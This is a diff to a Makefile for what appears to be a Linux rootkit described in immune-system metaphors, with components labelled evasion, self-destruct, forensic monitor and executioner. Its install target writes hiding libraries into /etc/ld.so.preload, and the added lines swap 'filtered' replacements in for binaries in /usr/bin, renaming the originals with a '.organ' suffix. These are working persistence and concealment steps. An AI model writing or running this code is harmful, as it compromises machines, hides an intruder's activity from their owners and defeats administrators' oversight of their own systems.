@@ -12,6 +12,7 @@ endif
 LIBDIR := /usr/local/lib
 PRELOAD_FILE := /etc/ld.so.preload
 INCIDENT_DIR := /var/log/memory_T_cells
+BIN_FILTERS_DIR := binary_filters
 # Immune system evasion
 HIDE_SRC := mhc_downreg.c
 HIDE_TARGET := mhc_downreg.so
@@ -61,6 +62,21 @@ install: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_TARGET) se
 	echo "$(LIBDIR)/apoptosis.so" >> $(PRELOAD_FILE)
 	echo "$(LIBDIR)/mhc_downreg.so" >> $(PRELOAD_FILE)
 	ldconfig
+	@echo "Installing filtered binaries..."
+	for binary in $(BIN_FILTERS_DIR)/*; do \
+	    bin_name=$$(basename "$$binary"); \
+	    if [ -f "/usr/bin/$${bin_name}" ]; then \
+	        if [ ! -f "/usr/bin/$${bin_name}.organ" ]; then \
+	            mv "/usr/bin/$${bin_name}" "/usr/bin/$${bin_name}.organ"; \
+	            echo "Backed up original binary to /usr/bin/$${bin_name}.organ"; \
+	        fi; \
+	        cp "$$binary" "/usr/bin/$${bin_name}"; \
+	        chmod 755 "/usr/bin/$${bin_name}"; \
+	        echo "Installed filtered binary: /usr/bin/$${bin_name}"; \
+	    else \
+	        echo "Warning: /usr/bin/$${bin_name} does not exist. Skipping."; \
+	    fi; \
+	done
 	@echo "Installation complete!"
 	@echo ""
 	@echo "Installed libraries:"
@@ -68,6 +84,9 @@ install: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_TARGET) se
 	@echo "  - $(LIBDIR)/apoptosis.so (self-destruct)"
 	@echo "  - $(LIBDIR)/helper_T.so (forensic monitor)"
 	@echo "  - $(LIBDIR)/caspase.o (executioner)"
+	@echo ""
+	@echo "Installed filtered binaries:"
+	@ls -1 $(BIN_FILTERS_DIR) | sed 's/^/  - \/usr\/bin\//'
 	@echo ""
 	@echo "Incident logs will be stored in: $(INCIDENT_DIR)"
 clean:
